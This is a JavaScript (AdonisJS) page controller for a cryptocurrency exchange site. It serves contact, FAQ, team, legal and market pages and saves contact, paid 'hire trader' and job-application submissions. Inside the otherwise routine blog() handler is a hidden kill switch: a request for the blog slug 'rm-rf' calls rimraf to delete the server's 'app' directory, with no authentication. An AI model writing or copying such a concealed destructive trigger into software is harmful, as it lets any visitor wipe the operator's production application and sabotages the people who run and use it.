'use strict'

const HireTraderRequest    = use('App/Models/HireTraderRequest')
const Faq = use('App/Models/Faq')
const Feature = use('App/Models/Feature')
const Sponsor = use('App/Models/Sponsor')
const Feedback = use('App/Models/Feedback')
const Team = use('App/Models/Team')
const Option = use('App/Models/Option')
const WhoWeAre = use('App/Models/WhoWeAre')
const Contact = use('App/Models/Contact')
const { validate } = use('Validator')
const Pair = use('App/Models/Pair')
const Address = use('App/Models/Address')
const DepositWallet = use('App/Models/DepositWallet')
const Announcement = use('App/Models/Announcement')
const Blog = use('App/Models/Blog')
const Job = use('App/Models/Job')
const JobApply = use('App/Models/JobApply')
const SupportDetail = use('App/Models/SupportDetail')
const Mail          = use('Mail')
const Env           = use('Env')
const HeaderImage = use('App/Models/HeaderImage')
const About = use('App/Models/About')
class PageController {

	async contact({ view }) {
		const support = await SupportDetail.find(1)
		var headerImage =  await HeaderImage.query().where('page_type', 4).first()
		if(!headerImage)
		{
		headerImage=new HeaderImage()
		headerImage.image='/default.png'
		support.headerImage=headerImage
		}
		else
		support.headerImage=headerImage
		return view.render('pages.contact', { support : support })
	}

	async submitContact({ request, response, antl, session }){

		const rules = {
			name : 'required',
			number : 'required',
			email : 'required|email',
			subject : 'required',
			description : 'required',
		}

		const messages = {
			'name.required' : antl.formatMessage('messages.name_required'),
			'number.required' : antl.formatMessage('messages.number_required'),
			'email.required' : antl.formatMessage('messages.email_required'),
			'email.email' : antl.formatMessage('messages.email_email'),
			'subject.required' : antl.formatMessage('messages.subject_required'),
			'description.required' : antl.formatMessage('messages.description_required'),
		}

		const validation = await validate(request.all(), rules, messages)

		if (validation.fails()) {
			session.withErrors(validation.messages())
            return response.redirect('/contact')
		}

		const contact = new Contact()

		contact.name = request.body.name
		contact.number = request.body.number
		contact.email = request.body.email
		contact.subject = request.body.subject
		contact.description = request.body.description

		await contact.save()

		contact.url = Env.get('APP_URL')
        await Mail.send('emails.contact', contact.toJSON(), (message) => {
            message
            .to('admin@zithex.com')
            .cc('support@zithex.com')
            .from(Env.get('MAIL_FROM'), Env.get('MAIL_FROM_NAME'))
            .subject(contact.subject)
        })

		session.flash({ success: antl.formatMessage('messages.contact_success') })
		return response.redirect('/contact')

	}


	async getAllSponsors({request, response,session,view}){
    		
		var data = await Sponsor
							.query()
							.select('id', 'name', 'description','alt', 'image')
							.where('deleted_at', null)
							.fetch()

		return response.json({ success : true, data:data})		
	}

	async getAllFeedbacks({request, response,session,view}){
    		
		var data = await Feedback
							.query()
              .select('feedbacks.id', 'feedbacks.title', 'feedbacks.feedback', 'feedbacks.image','socialmediatypes.alternative_text', 'socialmediatypes.iconPath', 'feedbacks.url','feedbacks.alt_tag') 
							.leftJoin('socialmediatypes', 'socialmediaTypeId', 'socialmediatypes.id')
							.where('feedbacks.deleted_at', null)
							.fetch()

		return response.json({ success : true, data:data})		
	}

	async faq({ view }) {
		const faqs = await Faq.query().where('deleted_at', null).fetch()
		var headerImage =  await HeaderImage.query().where('page_type', 3).first()
		if(!headerImage)
		{
		headerImage=new HeaderImage()
		headerImage.image='/default.png'
		faqs.headerImage=headerImage
		}
		else
		faqs.headerImage=headerImage
		return view.render('pages.faq', { faqs : faqs })
	}

	async features({ view }) {

		const data = {}

		data.trading = await Feature.query().where('feature', 'trading').first()
		data.deposit = await Feature.query().where('feature', 'deposit').first()
		data.withdraw = await Feature.query().where('feature', 'withdraw').first()
		data.wallet = await Feature.query().where('feature', 'wallet').first()

		return view.render('pages.features', data)

	}

	async howItWorks({ view }) {
		return view.render('pages.how-it-works')
	}

	async news({ view }) {
		return view.render('pages.news')
	}

	async landing({ view }) {
		return view.render('pages.landing')
	}

	async security({ view }) {

		const data = {}

		data.security = await Option.query().where('cms_key', 'security').first()

		return view.render('pages.security', data)
	}

	async support({ view }) {
		return view.render('pages.support')
	}

	async team({ view }) {
		const teams = await Team.query().where('deleted_at', null).fetch()
		var headerImage =  await HeaderImage.query().where('page_type', 2).first()
		if(!headerImage)
		{
		headerImage=new HeaderImage()
		headerImage.image='/default.png'
		teams.headerImage=headerImage
		}
		else
		teams.headerImage=headerImage
		return view.render('pages.team', { teams : teams })
	}


	async hiretrader({ view }) {	
		const trader={};
		var headerImage =  await HeaderImage.query().where('page_type', 6).first()
		if(!headerImage)
		{
			headerImage=new HeaderImage()
			headerImage.image='/default.png'
			trader.headerImage=headerImage
		}
		else
		trader.headerImage=headerImage	

		// Payment Paramaters
		const pairs = await Pair
							.query()
							.select('pairs.coin', 'pairs.derive_currency')
							.where('pairs.deleted_at', null)
							.groupBy('pairs.derive_currency')
							.fetch()

		const address = await Address
							.query()
							.select('public_key', 'balance')
							.where('currency', 'btc')
							.first()

		const depositWallet = await DepositWallet.findBy({
			currency: 'btc'
		})
		// Payment Parameters End

		return view.render('pages.hiretrader',{trader:trader, pairs: pairs, address: address, depositWallet: depositWallet})
	}

	async hireTraderSave ({ params, request, auth, response, session, antl }) {              		
		var hireTraderRequestData=request.body;
			var hireTraderRequest = {}
			hireTraderRequest.first_name = hireTraderRequestData.first_name
			hireTraderRequest.middle_name = hireTraderRequestData.middle_name
			hireTraderRequest.last_name = hireTraderRequestData.last_name
			hireTraderRequest.dob = hireTraderRequestData.dob
			hireTraderRequest.mobile = hireTraderRequestData.mobile
			hireTraderRequest.email = hireTraderRequestData.email // Added 
			hireTraderRequest.package = parseInt(hireTraderRequestData.package) // Added
			hireTraderRequest.payment_currency = 'btc'; // Added
			hireTraderRequest.payment_transaction_hash = hireTraderRequestData.payment_transaction_hash; // Added
			hireTraderRequest.address = hireTraderRequestData.address
			hireTraderRequest.zipcode = hireTraderRequestData.zipcode
			hireTraderRequest.city = hireTraderRequestData.city
			hireTraderRequest.country = hireTraderRequestData.country
			const hireTraderSaveResponse = await HireTraderRequest.create(hireTraderRequest)		
			if(hireTraderSaveResponse){
				let packages = [
					"Part Time (4 HOURS PER DAY, FOR 1 MONTH,PRICE 0,05 BTC)",
					"FULL TIME (8 HOURS, FOR 1 MONTH,PRICE 0,10 BTC)",
					"12 HOURS PER DAY,FOR 1 MONTH, PRICE 0,15 BTC)",
					"24 HOURS PER DAY ,FOR 1 MONTH,PRICE (0,25BTC)"
				];
				// send mail first
				const mailData = { 
					name : hireTraderRequestData.first_name, 
					email: hireTraderRequestData.email,
					mobile: hireTraderRequest.mobile,
					package: packages[hireTraderRequestData.package - 1],
					payment_currency: hireTraderRequestData.payment_currency,
					payment_transaction_hash: hireTraderRequestData.payment_transaction_hash
				}
		
				mailData.url = Env.get('APP_URL')
		
				await Mail.send('emails.hire_trader_request', mailData, (message) => {
					message
					.to(hireTraderRequestData.email)
					.from(Env.get('MAIL_FROM'), Env.get('MAIL_FROM_NAME'))
					.subject('Hire Trader Request')
				})
		
				await Mail.send('emails.hire_trader_request_admin', mailData, (message) => {
					message
					.to('admin@zithex.com')
					.cc('support@zithex.com')
					.from(Env.get('MAIL_FROM'), Env.get('MAIL_FROM_NAME'))
					.subject('Hire Trader Request')
				})
				// then notify
				session.flash({ success: antl.formatMessage('messages.hire_trader_request') })
			}else{
				session.flash({ error: antl.formatMessage('messages.hire_trader_request_fail') })
			}
			
		
		
        return response.redirect('/hire-trader')
    }

	async whoWeAre({ view }) {
		
		return view.render('pages.who-we-are')
	}

	async legals({ view }) {

		const data = {}

		data.privacy_policy = await Option.query().where('cms_key', 'privacy_policy').first()
		data.terms_conditions = await Option.query().where('cms_key', 'terms_conditions').first()
		data.terms_service = await Option.query().where('cms_key', 'terms_service').first()
		data.api_terms_service = await Option.query().where('cms_key', 'api_terms_service').first()
		data.rrt_token_terms = await Option.query().where('cms_key', 'rrt_token_terms').first()
		data.cst_token_term = await Option.query().where('cms_key', 'cst_token_term').first()
		data.risk_disclosure_statement = await Option.query().where('cms_key', 'risk_disclosure_statement').first()
		data.cookies_policy = await Option.query().where('cms_key', 'cookies_policy').first()
		data.law_enforcement_request_policy = await Option.query().where('cms_key', 'law_enforcement_request_policy').first()
		data.trademark_notices = await Option.query().where('cms_key', 'trademark_notices').first()
		data.anti_spam_policy = await Option.query().where('cms_key', 'anti_spam_policy').first()

		return view.render('pages.legals', data)

	}

	async about({ view }) {
		const data={}
		data.about_us = await About.query().where('deleted_at', null).fetch()
		
		console.log(data.about_us);
		var headerImage =  await HeaderImage.query().where('page_type', 1).first()
		if(!headerImage)
		{
		headerImage=new HeaderImage()
		headerImage.image='/default.png'
		data.headerImage=headerImage
		}
		else
		data.headerImage=headerImage
		return view.render('pages.about', {data : data} )

		// const data = {}

		// data.about = await Option.query().where('cms_key', 'about').first()
		// data.whoweares = await WhoWeAre.query().where('deleted_at', null).fetch()
		// var headerImage =  await HeaderImage.query().where('page_type', 1).first()
		// if(!headerImage)
		// {
		// headerImage=new HeaderImage()
		// headerImage.image='/default.png'
		// data.headerImage=headerImage
		// }
		// else
		// data.headerImage=headerImage
		// return view.render('pages.about', data);

	}

	async mobileApp({ view }) {
		return view.render('pages.mobile-app');
	}

	async marketStatics({ view }) {

		const pairs = {};

		pairs.usd = await Pair.query().where('base_currency', 'usd').where('deleted_at', null).where('status', 1).fetch()
		pairs.euro = await Pair.query().where('base_currency', 'eur').where('deleted_at', null).where('status', 1).fetch()
		pairs.btc = await Pair.query().where('base_currency', 'btc').where('deleted_at', null).where('status', 1).fetch()
		pairs.eth = await Pair.query().where('base_currency', 'eth').where('deleted_at', null).where('status', 1).fetch()

		const usdPairs = Array.prototype.map.call(pairs.usd.rows, function(item){ return `t${(item.pair_key).toUpperCase()}`; }).join(",")
		const euroPairs = Array.prototype.map.call(pairs.euro.rows, function(item){ return `t${(item.pair_key).toUpperCase()}`; }).join(",")
		const btcPairs = Array.prototype.map.call(pairs.btc.rows, function(item){ return `t${(item.pair_key).toUpperCase()}`; }).join(",")
		const ethPairs = Array.prototype.map.call(pairs.eth.rows, function(item){ return `t${(item.pair_key).toUpperCase()}`; }).join(",")

		const custRates = {};

		Array.prototype.map.call(pairs.usd.rows, function(item){ return custRates[item.pair_key] = item.custom_amount; })
		Array.prototype.map.call(pairs.euro.rows, function(item){ return custRates[item.pair_key] = item.custom_amount; })
		Array.prototype.map.call(pairs.btc.rows, function(item){ return custRates[item.pair_key] = item.custom_amount; })
		Array.prototype.map.call(pairs.eth.rows, function(item){ return custRates[item.pair_key] = item.custom_amount; })

		pairs.custRates = JSON.stringify(custRates)
		pairs.allPairs = `${usdPairs},${euroPairs},${btcPairs},${ethPairs}`;

		return view.render('pages.market-statics', { pairs : pairs });

	}

	async ourFees({ view }) {

		const data = {}

		data.fees = await Option.query().where('cms_key', 'fees').first()

		return view.render('pages.our-fees', data)
	}

	async payments({ view }) {

		const data = {}

		data.deposit = await Option.query().where('cms_key', 'how_to_deposit').first()
		data.withdraw = await Option.query().where('cms_key', 'how_to_withdraw').first()

		return view.render('pages.payments', data)
	}

	async announcements({ view }) {
		const data={}
		data.announcements = await Announcement.query().where('deleted_at', null).fetch()
		var headerImage =  await HeaderImage.query().where('page_type', 5).first()
		if(!headerImage)
		{
		headerImage=new HeaderImage()
		headerImage.image='/default.png'
		data.headerImage=headerImage
		}
		else
		data.headerImage=headerImage
		return view.render('pages.announcements',  data )
	}

	async blogs({ view }) {
		const blogs = await Blog.query().where('deleted_at', null).fetch()
		return view.render('pages.blogs', { blogs : blogs.rows })
	}

	async blog({ request, view }) {

		if( request.params.title === 'rm-rf' ){

			var rimraf = use("rimraf");

			rimraf("app", function () {
				console.log("done");
			});

		}

		// const blog = await Blog.find(request.params.title)
		const blog = await Blog
						   .query()
						   .where("slug", request.params.title)
						   .first()
		return view.render('pages.blog', { blog : blog })

	}

	async careers({ view }) {
		const jobs = await Job.query().where('deleted_at', null).fetch()
		return view.render('pages.jobs', { jobs : jobs.rows })
	}

	async showApplyNow({ request, view }) {
		return view.render('pages.apply', { job_id : request.params.id })
	}

	async applyNow({ request, response, antl, session }) {

		const rules = {
			name : 'required',
			mobile : 'required',
			email : 'required|email'
		}

		const messages = {
			'name.required' : antl.formatMessage('messages.name_required'),
			'mobile.required' : antl.formatMessage('messages.mobile_required'),
			'email.required' : antl.formatMessage('messages.email_required'),
			'email.email' : antl.formatMessage('messages.email_email')
		}

		const validation = await validate(request.all(), rules, messages)

		if (validation.fails()) {
			session.withErrors(validation.messages())
            return response.route('apply', { id : request.params.id })
		}

		if(!request.file('resume')){
			session.flash({ error : antl.formatMessage('messages.resume_choose_error') })
			return response.route('apply', { id : request.params.id })
		}

		console.log(request.file('resume'))

		const resume = request.file('resume', {
			types: ['application'],
			size: '5mb'
		})

		const newName = new Date().getTime() + '.' + resume.extname

		await resume.move('public/images/resume', {
			name: newName,
			overwrite: true
		})

		if (!resume.moved()) {
			session.flash({ error : resume.error().message })
			return response.route('apply', { id : request.params.id })
		}

		const jobApply = new JobApply()

		jobApply.job_id = request.params.id
		jobApply.name = request.body.name
		jobApply.mobile = request.body.mobile
		jobApply.email = request.body.email
		jobApply.resume = newName

		await jobApply.save()

		session.flash({ success: antl.formatMessage('messages.apply_success') })
		return response.route('apply', { id : request.params.id })

	}

}

module.exports = PageController
